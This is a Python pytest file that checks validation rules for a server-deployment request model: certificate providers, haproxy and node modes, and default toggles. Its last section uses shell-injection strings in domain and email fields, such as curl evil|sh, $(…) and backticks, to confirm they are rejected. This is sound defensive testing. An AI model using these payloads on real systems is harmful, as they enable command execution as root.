"""DeployRequest model validation — the Ф4 field changes.

NOTE: not executed in this environment (only Python 3.14 available, pydantic-core
has no wheel; target runtime is 3.11). Verified by py_compile + the mirroring
frontend `validateForm` unit tests. Runs in real CI on Python 3.11.
"""
import pytest
from pydantic import ValidationError

from app.models.deploy import DeployRequest


def _remna(**over):
    base = dict(
        mode="remnanode",
        ip="1.2.3.4",
        ssh_password="pw",
        domain="node1.example.com",
        cert_provider="cloudflare",
        cloudflare_api_key="cf-token",
        email="a@b.co",
        remnanode_token="eyJ.token",
        open_ports="80,443",
        country_code="DE",
    )
    base.update(over)
    return base


def _haproxy(**over):
    base = dict(mode="haproxy", ip="1.2.3.4", ssh_password="pw",
                open_ports="443", haproxy_dest_ip="10.0.0.5")
    base.update(over)
    return base


def test_valid_remnanode():
    r = DeployRequest(**_remna())
    assert r.cert_provider == "cloudflare"
    # new fields default sensibly
    assert r.install_vnstat is True
    assert r.install_trafficguard is True
    assert r.allow_ssh_all is False
    assert r.whitelist_ips == ""


def test_valid_haproxy():
    r = DeployRequest(**_haproxy())
    assert r.haproxy_dest_ip == "10.0.0.5"


def test_bandwidth_mbps_no_longer_required_and_ignored():
    # was a required field; now removed. A request without it must succeed…
    DeployRequest(**_remna())
    # …and an extra bandwidth_mbps is ignored (not stored), not an error.
    r = DeployRequest(**_remna(bandwidth_mbps=100))
    assert not hasattr(r, "bandwidth_mbps")


def test_cloudflare_token_required_only_for_cloudflare_provider():
    # cloudflare provider without a token → error
    with pytest.raises(ValidationError):
        DeployRequest(**_remna(cloudflare_api_key="", cert_provider="cloudflare"))
    # letsencrypt / zerossl need no CF token
    DeployRequest(**_remna(cloudflare_api_key="", cert_provider="letsencrypt"))
    DeployRequest(**_remna(cloudflare_api_key="", cert_provider="zerossl"))


def test_cert_provider_is_constrained():
    with pytest.raises(ValidationError):
        DeployRequest(**_remna(cert_provider="self-signed"))


def test_email_still_required_in_remnanode_regardless_of_provider():
    with pytest.raises(ValidationError):
        DeployRequest(**_remna(email="", cert_provider="letsencrypt"))


def test_haproxy_requires_dest_ip():
    with pytest.raises(ValidationError):
        DeployRequest(**_haproxy(haproxy_dest_ip=""))


def test_haproxy_mode_ignores_remnanode_requirements():
    # domain/email/cf/country not required in haproxy mode
    DeployRequest(**_haproxy(domain="", email="", cloudflare_api_key="", country_code="XX"))


def test_vanilla_variant_optional_domain_email():
    # Plan B 2b: vanilla node install has no local SSL/masking → domain/email/cf
    # optional (Hysteria2 off so it doesn't demand a domain).
    r = DeployRequest(**_remna(node_variant="vanilla", domain="", email="",
                               cloudflare_api_key="", install_hysteria2=False))
    assert r.node_variant == "vanilla"


def test_vanilla_hysteria2_requires_domain():
    # Hysteria2 (Certbot standalone) still needs a domain even in vanilla mode.
    with pytest.raises(ValidationError):
        DeployRequest(**_remna(node_variant="vanilla", domain="", install_hysteria2=True))


def test_egames_variant_still_requires_domain():
    with pytest.raises(ValidationError):
        DeployRequest(**_remna(node_variant="egames", domain=""))


def test_plan_b_toggle_defaults():
    r = DeployRequest(**_remna())
    assert r.node_variant == "egames"
    assert r.install_hysteria2 is True
    assert r.docker_mirror is False and r.cookie_gate is False


def test_invalid_ip_rejected():
    with pytest.raises(ValidationError):
        DeployRequest(**_remna(ip="999.1.1.1"))


def test_whitelist_ips_accepts_freeform():
    r = DeployRequest(**_remna(whitelist_ips="1.2.3.4, 10.0.0.0/24 garbage"))
    assert r.whitelist_ips == "1.2.3.4, 10.0.0.0/24 garbage"


# ── shell-injection hardening: domain/email are interpolated into root bash ──

@pytest.mark.parametrize("bad", [
    'node.evil.com"; curl evil|sh #',
    "node.evil.com$(curl evil)",
    "node.evil.com;reboot",
    "node.evil.com`id`",
    "a b.com",
    "node.evil.com\ncurl evil|sh",
])
def test_domain_rejects_shell_metacharacters(bad):
    with pytest.raises(ValidationError):
        DeployRequest(**_remna(domain=bad))


@pytest.mark.parametrize("bad", [
    'a@b.co"; curl evil|sh #',
    "x;curl evil|sh;@b.co",
    "a$(id)@b.co",
    "a@b.co`id`",
])
def test_email_rejects_shell_metacharacters(bad):
    with pytest.raises(ValidationError):
        DeployRequest(**_remna(email=bad))


def test_domain_and_email_valid_forms_pass():
    DeployRequest(**_remna(domain="sub.node-1.example.com", email="a.b+tag@ex-ample.co"))
